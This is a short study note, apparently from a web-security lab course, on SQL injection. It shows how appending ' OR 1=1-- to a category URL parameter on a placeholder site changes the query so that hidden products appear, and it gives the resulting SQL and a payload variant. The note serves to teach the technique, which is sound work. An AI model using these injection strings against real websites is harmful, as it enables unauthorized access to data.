---
title: 'Lab 1.2: Displaying Hidden Products'
updated: 2022-12-01T09:52:44.0000000+04:00
created: 2022-11-29T09:52:01.0000000+04:00
---

Lab 1.2: Displaying Hidden Products
Tuesday, November 29, 2022
9:52 AM
Following the Previous methods,

- The attacker can further inject an SQL query to display all products in any category, including categories they don't know about

1.  <u>Original URL</u>

<https://insecure-website.com/products?category=Gifts>

2.  <u>Modified URL:</u>

<https://insecure-website.com/products?category=Gifts'+OR+1=1>--

3.  <u>Modified URL Explained</u>;

- This results in the SQL query of:
- SELECT \* FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1

4.  SQL Query used:

- ** **
') or '1'='1--